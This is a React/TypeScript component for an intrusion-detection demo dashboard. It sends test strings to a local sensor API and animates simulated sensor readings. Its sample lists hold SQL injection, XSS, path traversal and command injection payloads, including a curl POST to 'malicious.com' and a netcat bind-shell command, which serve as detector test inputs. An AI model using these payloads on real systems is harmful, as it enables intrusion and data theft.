import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Cpu,
  Send,
  RotateCcw,
  AlertTriangle,
  Shield,
  Activity,
  Zap,
  Thermometer,
  Gauge,
  Waves,
  Wifi,
  Server,
  Heart
} from 'lucide-react';

interface SensorResponse {
  sensor_id: string;
  status: 'Normal' | 'Suspicious' | 'Attack';
  detected_attack_type: string | null;
  confidence: number;
  timestamp: string;
}

interface SensorStatus {
  sensor_id: string;
  status: string;
  last_input: string;
  detected_attack_type: string | null;
  confidence: number;
  last_detection_time: string | null;
  timestamp: string;
}

interface PhysicalSensorData {
  temperature: number;
  pressure: number;
  vibration: number;
  network_latency: number;
  cpu_usage: number;
  memory_usage: number;
}

const AttackSensorSimulator: React.FC = () => {
  const [payload, setPayload] = useState('');
  const [sensorResponse, setSensorResponse] = useState<SensorResponse | null>(null);
  const [loading, setLoading] = useState(false);
  const [sensorStatus, setSensorStatus] = useState<SensorStatus | null>(null);
  const [physicalSensors, setPhysicalSensors] = useState<PhysicalSensorData>({
    temperature: 22.5,
    pressure: 101.3,
    vibration: 0.1,
    network_latency: 15,
    cpu_usage: 25,
    memory_usage: 45
  });

  // Sample attack payloads for quick testing
  const samplePayloads = [
    "Hello world",
    "GET /admin?id=1 UNION SELECT * FROM users--",
    "<script>alert('XSS')</script>",
    "../../../etc/passwd",
    "'; DROP TABLE users; --",
    "GET /ping.php?host=127.0.0.1;cat /etc/passwd",
    "javascript:alert('XSS')",
    "normal user login request",
    "' OR 1=1 --",
    "<img src=x onerror=alert(1)>",
    "curl -X POST http://malicious.com/data",
    "nc -l -p 4444 -e /bin/bash"
  ];

  const attackCategories = [
    {
      name: "SQL Injection",
      payloads: [
        "GET /admin?id=1 UNION SELECT * FROM users--",
        "'; DROP TABLE users; --",
        "' OR 1=1 --",
        "admin'/*",
        "1' AND 1=1 --"
      ]
    },
    {
      name: "XSS Attacks",
      payloads: [
        "<script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<img src=x onerror=alert(1)>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "';alert(String.fromCharCode(88,83,83))//'"
      ]
    },
    {
      name: "Command Injection",
      payloads: [
        "GET /ping.php?host=127.0.0.1;cat /etc/passwd",
        "curl -X POST http://malicious.com/data",
        "nc -l -p 4444 -e /bin/bash",
        "; ls -la",
        "| whoami"
      ]
    },
    {
      name: "Path Traversal",
      payloads: [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc%252fpasswd"
      ]
    }
  ];

  const baseValues = {
    temperature: 22.5,
    pressure: 101.3,
    vibration: 0.1,
    network_latency: 15,
    cpu_usage: 25,
    memory_usage: 45
  };

  const fetchSensorStatus = async () => {
    try {
      const response = await fetch('http://localhost:8000/api/sensor/status');
      if (response.ok) {
        const status = await response.json();
        setSensorStatus(status);
      }
    } catch (error) {
      console.error('Error fetching sensor status:', error);
    }
  };

  const updatePhysicalSensors = (status: string, attackType: string | null, confidence: number) => {
    const multiplier = confidence > 0.8 ? 3 : confidence > 0.5 ? 2 : 1;
    
    setPhysicalSensors(prev => ({
      temperature: status === 'Attack' 
        ? baseValues.temperature + (Math.random() * 10 + 5) * multiplier
        : status === 'Suspicious' 
        ? baseValues.temperature + (Math.random() * 5 + 2) * multiplier
        : baseValues.temperature + (Math.random() * 2 - 1),
      
      pressure: status === 'Attack'
        ? baseValues.pressure + (Math.random() * 15 + 10) * multiplier
        : status === 'Suspicious'
        ? baseValues.pressure + (Math.random() * 8 + 3) * multiplier
        : baseValues.pressure + (Math.random() * 3 - 1.5),
      
      vibration: status === 'Attack'
        ? Math.min(5.0, baseValues.vibration + (Math.random() * 2 + 1) * multiplier)
        : status === 'Suspicious'
        ? baseValues.vibration + (Math.random() * 0.8 + 0.3) * multiplier
        : baseValues.vibration + (Math.random() * 0.2 - 0.1),
      
      network_latency: status === 'Attack'
        ? baseValues.network_latency + (Math.random() * 100 + 50) * multiplier
        : status === 'Suspicious'
        ? baseValues.network_latency + (Math.random() * 40 + 20) * multiplier
        : baseValues.network_latency + (Math.random() * 10 - 5),
      
      cpu_usage: status === 'Attack'
        ? Math.min(95, baseValues.cpu_usage + (Math.random() * 40 + 30) * multiplier)
        : status === 'Suspicious'
        ? baseValues.cpu_usage + (Math.random() * 25 + 15) * multiplier
        : baseValues.cpu_usage + (Math.random() * 10 - 5),
      
      memory_usage: status === 'Attack'
        ? Math.min(90, baseValues.memory_usage + (Math.random() * 30 + 20) * multiplier)
        : status === 'Suspicious'
        ? baseValues.memory_usage + (Math.random() * 20 + 10) * multiplier
        : baseValues.memory_usage + (Math.random() * 8 - 4)
    }));
  };

  useEffect(() => {
    fetchSensorStatus();
    const interval = setInterval(fetchSensorStatus, 5000);
    return () => clearInterval(interval);
  }, []);

  // Gradual sensor normalization when no attacks
  useEffect(() => {
    const normalizeInterval = setInterval(() => {
      if (sensorStatus?.status === 'Normal' && !loading) {
        setPhysicalSensors(prev => ({
          temperature: prev.temperature > baseValues.temperature 
            ? Math.max(baseValues.temperature, prev.temperature - 0.5)
            : Math.min(baseValues.temperature, prev.temperature + 0.5),
          pressure: prev.pressure > baseValues.pressure
            ? Math.max(baseValues.pressure, prev.pressure - 0.8)
            : Math.min(baseValues.pressure, prev.pressure + 0.8),
          vibration: Math.max(baseValues.vibration, prev.vibration - 0.05),
          network_latency: prev.network_latency > baseValues.network_latency
            ? Math.max(baseValues.network_latency, prev.network_latency - 2)
            : Math.min(baseValues.network_latency, prev.network_latency + 2),
          cpu_usage: prev.cpu_usage > baseValues.cpu_usage
            ? Math.max(baseValues.cpu_usage, prev.cpu_usage - 1)
            : Math.min(baseValues.cpu_usage, prev.cpu_usage + 1),
          memory_usage: prev.memory_usage > baseValues.memory_usage
            ? Math.max(baseValues.memory_usage, prev.memory_usage - 1)
            : Math.min(baseValues.memory_usage, prev.memory_usage + 1)
        }));
      }
    }, 2000);

    return () => clearInterval(normalizeInterval);
  }, [sensorStatus?.status, loading]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!payload.trim()) return;

    setLoading(true);
    try {
      const response = await fetch('http://localhost:8000/api/sensor/input', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ payload }),
      });

      if (response.ok) {
        const result = await response.json();
        setSensorResponse(result);
        updatePhysicalSensors(result.status, result.detected_attack_type, result.confidence);
        fetchSensorStatus();
      } else {
        console.error('Failed to process sensor input');
      }
    } catch (error) {
      console.error('Error processing sensor input:', error);
    } finally {
      setLoading(false);
    }
  };

  const resetSensor = async () => {
    try {
      const response = await fetch('http://localhost:8000/api/sensor/reset', {
        method: 'POST',
      });
      if (response.ok) {
        setSensorResponse(null);
        setPayload('');
        setPhysicalSensors(baseValues);
        fetchSensorStatus();
      }
    } catch (error) {
      console.error('Error resetting sensor:', error);
    }
  };

  const fillSamplePayload = (sample: string) => {
    setPayload(sample);
  };

  const getStatusColor = (status: string) => {
    switch (status?.toLowerCase()) {
      case 'normal':
        return {
          bg: 'bg-green-500/10',
          border: 'border-green-500/30',
          text: 'text-green-400',
          pulse: 'bg-green-500'
        };
      case 'suspicious':
        return {
          bg: 'bg-yellow-500/10',
          border: 'border-yellow-500/30',
          text: 'text-yellow-400',
          pulse: 'bg-yellow-500'
        };
      case 'attack':
        return {
          bg: 'bg-red-500/10',
          border: 'border-red-500/30',
          text: 'text-red-400',
          pulse: 'bg-red-500'
        };
      default:
        return {
          bg: 'bg-gray-500/10',
          border: 'border-gray-500/30',
          text: 'text-gray-400',
          pulse: 'bg-gray-500'
        };
    }
  };

  const getSensorValueColor = (value: number, baseline: number, threshold: number) => {
    const diff = Math.abs(value - baseline);
    if (diff > threshold * 2) return 'text-red-400';
    if (diff > threshold) return 'text-yellow-400';
    return 'text-green-400';
  };

  const getStatusIcon = (status: string) => {
    switch (status?.toLowerCase()) {
      case 'normal':
        return Shield;
      case 'suspicious':
        return AlertTriangle;
      case 'attack':
        return Zap;
      default:
        return Activity;
    }
  };

  const currentStatus = sensorResponse?.status || sensorStatus?.status || 'Normal';
  const statusColors = getStatusColor(currentStatus);
  const StatusIcon = getStatusIcon(currentStatus);

  return (
    <div className="space-y-6">
      {/* Header */}
      <motion.div
        initial={{ opacity: 0, y: -20 }}
        animate={{ opacity: 1, y: 0 }}
        className="flex items-center justify-between"
      >
        <div>
          <h1 className="text-3xl font-bold glow-text flex items-center">
            <Cpu className="h-8 w-8 mr-3 text-primary" />
            Attack Sensor Simulator
          </h1>
          <p className="text-muted-foreground">
            Real-time physical sensor monitoring and attack simulation
          </p>
        </div>
        <button
          onClick={resetSensor}
          className="flex items-center space-x-2 bg-gray-700 hover:bg-gray-600 px-4 py-2 rounded-lg transition-colors"
        >
          <RotateCcw className="h-4 w-4" />
          <span>Reset All Sensors</span>
        </button>
      </motion.div>

      {/* Main Sensor Status */}
      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        className={`${statusColors.bg} ${statusColors.border} border rounded-lg p-6 matrix-bg`}
      >
        <div className="flex items-center justify-between mb-4">
          <div className="flex items-center space-x-3">
            <motion.div
              animate={{ scale: [1, 1.2, 1] }}
              transition={{ duration: 2, repeat: Infinity }}
              className={`h-4 w-4 ${statusColors.pulse} rounded-full`}
            />
            <h2 className="text-xl font-semibold">Main IDS Sensor: {sensorStatus?.sensor_id || 'IDS-001'}</h2>
          </div>
          <div className={`flex items-center space-x-2 ${statusColors.text}`}>
            <StatusIcon className="h-6 w-6" />
            <span className="text-xl font-bold">{currentStatus}</span>
          </div>
        </div>

        <AnimatePresence>
          {(sensorResponse?.detected_attack_type || sensorStatus?.detected_attack_type) && (
            <motion.div
              initial={{ opacity: 0, height: 0 }}
              animate={{ opacity: 1, height: 'auto' }}
              exit={{ opacity: 0, height: 0 }}
              className="border-t border-gray-600 pt-4 mt-4"
            >
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <span className="text-sm text-muted-foreground">Detected Attack:</span>
                  <span className={`block text-lg font-medium ${statusColors.text}`}>
                    {sensorResponse?.detected_attack_type || sensorStatus?.detected_attack_type}
                  </span>
                </div>
                <div>
                  <span className="text-sm text-muted-foreground">Confidence:</span>
                  <span className="block text-lg font-medium">
                    {((sensorResponse?.confidence || sensorStatus?.confidence || 0) * 100).toFixed(1)}%
                  </span>
                </div>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </motion.div>

      {/* Physical Sensors Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
        {/* Temperature Sensor */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.1 }}
          className="bg-card border border-border rounded-lg p-6"
        >
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center space-x-2">
              <Thermometer className="h-5 w-5 text-orange-400" />
              <h3 className="font-semibold">Temperature</h3>
            </div>
            <motion.div
              animate={currentStatus === 'Attack' ? { scale: [1, 1.1, 1] } : {}}
              transition={{ duration: 1, repeat: currentStatus === 'Attack' ? Infinity : 0 }}
              className={`text-2xl font-bold ${getSensorValueColor(physicalSensors.temperature, baseValues.temperature, 5)}`}
            >
              {physicalSensors.temperature.toFixed(1)}°C
            </motion.div>
          </div>
          <div className="text-xs text-muted-foreground">
            Normal: {baseValues.temperature}°C | Current: {physicalSensors.temperature > baseValues.temperature + 5 ? 'HIGH' : physicalSensors.temperature < baseValues.temperature - 5 ? 'LOW' : 'NORMAL'}
          </div>
        </motion.div>

        {/* Pressure Sensor */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2 }}
          className="bg-card border border-border rounded-lg p-6"
        >
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center space-x-2">
              <Gauge className="h-5 w-5 text-blue-400" />
              <h3 className="font-semibold">Pressure</h3>
            </div>
            <motion.div
              animate={currentStatus === 'Attack' ? { scale: [1, 1.1, 1] } : {}}
              transition={{ duration: 1, repeat: currentStatus === 'Attack' ? Infinity : 0 }}
              className={`text-2xl font-bold ${getSensorValueColor(physicalSensors.pressure, baseValues.pressure, 8)}`}
            >
              {physicalSensors.pressure.toFixed(1)} kPa
            </motion.div>
          </div>
          <div className="text-xs text-muted-foreground">
            Normal: {baseValues.pressure} kPa | Current: {physicalSensors.pressure > baseValues.pressure + 8 ? 'HIGH' : 'NORMAL'}
          </div>
        </motion.div>

        {/* Vibration Sensor */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.3 }}
          className="bg-card border border-border rounded-lg p-6"
        >
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center space-x-2">
              <Waves className="h-5 w-5 text-purple-400" />
              <h3 className="font-semibold">Vibration</h3>
            </div>
            <motion.div
              animate={currentStatus === 'Attack' ? { scale: [1, 1.1, 1], x: [-2, 2, -2, 2, 0] } : {}}
              transition={{ duration: 0.5, repeat: currentStatus === 'Attack' ? Infinity : 0 }}
              className={`text-2xl font-bold ${getSensorValueColor(physicalSensors.vibration, baseValues.vibration, 0.5)}`}
            >
              {physicalSensors.vibration.toFixed(2)} Hz
            </motion.div>
          </div>
          <div className="text-xs text-muted-foreground">
            Normal: {baseValues.vibration} Hz | Current: {physicalSensors.vibration > 1.0 ? 'CRITICAL' : physicalSensors.vibration > 0.5 ? 'HIGH' : 'NORMAL'}
          </div>
        </motion.div>

        {/* Network Latency */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.4 }}
          className="bg-card border border-border rounded-lg p-6"
        >
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center space-x-2">
              <Wifi className="h-5 w-5 text-green-400" />
              <h3 className="font-semibold">Network Latency</h3>
            </div>
            <motion.div
              animate={currentStatus === 'Attack' ? { color: ['#ef4444', '#f97316', '#ef4444'] } : {}}
              transition={{ duration: 1, repeat: currentStatus === 'Attack' ? Infinity : 0 }}
              className={`text-2xl font-bold ${getSensorValueColor(physicalSensors.network_latency, baseValues.network_latency, 20)}`}
            >
              {physicalSensors.network_latency.toFixed(0)} ms
            </motion.div>
          </div>
          <div className="text-xs text-muted-foreground">
            Normal: {baseValues.network_latency}ms | Current: {physicalSensors.network_latency > 100 ? 'SLOW' : physicalSensors.network_latency > 50 ? 'DELAYED' : 'GOOD'}
          </div>
        </motion.div>

        {/* CPU Usage */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.5 }}
          className="bg-card border border-border rounded-lg p-6"
        >
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center space-x-2">
              <Server className="h-5 w-5 text-cyan-400" />
              <h3 className="font-semibold">CPU Usage</h3>
            </div>
            <motion.div
              animate={currentStatus === 'Attack' ? { scale: [1, 1.05, 1] } : {}}
              transition={{ duration: 0.8, repeat: currentStatus === 'Attack' ? Infinity : 0 }}
              className={`text-2xl font-bold ${getSensorValueColor(physicalSensors.cpu_usage, baseValues.cpu_usage, 15)}`}
            >
              {physicalSensors.cpu_usage.toFixed(1)}%
            </motion.div>
          </div>
          <div className="text-xs text-muted-foreground">
            Normal: {baseValues.cpu_usage}% | Current: {physicalSensors.cpu_usage > 80 ? 'CRITICAL' : physicalSensors.cpu_usage > 60 ? 'HIGH' : 'NORMAL'}
          </div>
        </motion.div>

        {/* Memory Usage */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.6 }}
          className="bg-card border border-border rounded-lg p-6"
        >
          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center space-x-2">
              <Heart className="h-5 w-5 text-pink-400" />
              <h3 className="font-semibold">Memory Usage</h3>
            </div>
            <motion.div
              animate={currentStatus === 'Attack' ? { scale: [1, 1.05, 1] } : {}}
              transition={{ duration: 1.2, repeat: currentStatus === 'Attack' ? Infinity : 0 }}
              className={`text-2xl font-bold ${getSensorValueColor(physicalSensors.memory_usage, baseValues.memory_usage, 10)}`}
            >
              {physicalSensors.memory_usage.toFixed(1)}%
            </motion.div>
          </div>
          <div className="text-xs text-muted-foreground">
            Normal: {baseValues.memory_usage}% | Current: {physicalSensors.memory_usage > 80 ? 'CRITICAL' : physicalSensors.memory_usage > 65 ? 'HIGH' : 'NORMAL'}
          </div>
        </motion.div>
      </div>

      {/* Attack Simulation Panel */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Input Form */}
        <motion.div
          initial={{ opacity: 0, x: -20 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.7 }}
          className="bg-card border border-border rounded-lg p-6"
        >
          <h3 className="text-lg font-semibold mb-4 flex items-center">
            <Send className="h-5 w-5 mr-2 text-primary" />
            Attack Payload Input
          </h3>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <label htmlFor="payload" className="block text-sm font-medium mb-2">
                Test Payload
              </label>
              <textarea
                id="payload"
                value={payload}
                onChange={(e) => setPayload(e.target.value)}
                placeholder="Enter attack payload to test sensor response..."
                rows={6}
                className="w-full px-3 py-2 bg-gray-800 border border-gray-600 rounded-lg focus:ring-2 focus:ring-primary focus:border-transparent resize-none"
              />
            </div>

            <button
              type="submit"
              disabled={loading || !payload.trim()}
              className="w-full flex items-center justify-center space-x-2 bg-primary hover:bg-primary/80 disabled:bg-gray-600 disabled:cursor-not-allowed text-white px-4 py-3 rounded-lg transition-colors"
            >
              {loading ? (
                <motion.div
                  animate={{ rotate: 360 }}
                  transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                  className="h-5 w-5 border-2 border-white border-t-transparent rounded-full"
                />
              ) : (
                <>
                  <Send className="h-4 w-4" />
                  <span>Simulate Attack</span>
                </>
              )}
            </button>
          </form>

          {/* Response Display */}
          <AnimatePresence>
            {sensorResponse && (
              <motion.div
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -10 }}
                className="mt-6 p-4 bg-gray-800 border border-gray-600 rounded-lg"
              >
                <h4 className="text-sm font-medium mb-2">Latest Response:</h4>
                <div className="text-xs space-y-1 text-muted-foreground">
                  <div>Timestamp: {new Date(sensorResponse.timestamp).toLocaleString()}</div>
                  <div>Sensor ID: {sensorResponse.sensor_id}</div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </motion.div>

        {/* Sample Payloads */}
        <motion.div
          initial={{ opacity: 0, x: 20 }}
          animate={{ opacity: 1, x: 0 }}
          transition={{ delay: 0.8 }}
          className="bg-card border border-border rounded-lg p-6"
        >
          <h3 className="text-lg font-semibold mb-4">Quick Test Samples</h3>
          
          <div className="space-y-4">
            {attackCategories.map((category, categoryIndex) => (
              <div key={categoryIndex}>
                <h4 className="text-sm font-medium text-muted-foreground mb-2">{category.name}</h4>
                <div className="grid grid-cols-1 gap-2">
                  {category.payloads.map((sample, index) => (
                    <button
                      key={index}
                      onClick={() => fillSamplePayload(sample)}
                      className="text-left p-2 text-xs bg-gray-800 hover:bg-gray-700 border border-gray-600 rounded transition-colors truncate"
                      title={sample}
                    >
                      {sample.length > 40 ? `${sample.substring(0, 40)}...` : sample}
                    </button>
                  ))}
                </div>
              </div>
            ))}
          </div>
        </motion.div>
      </div>
    </div>
  );
};

export default AttackSensorSimulator;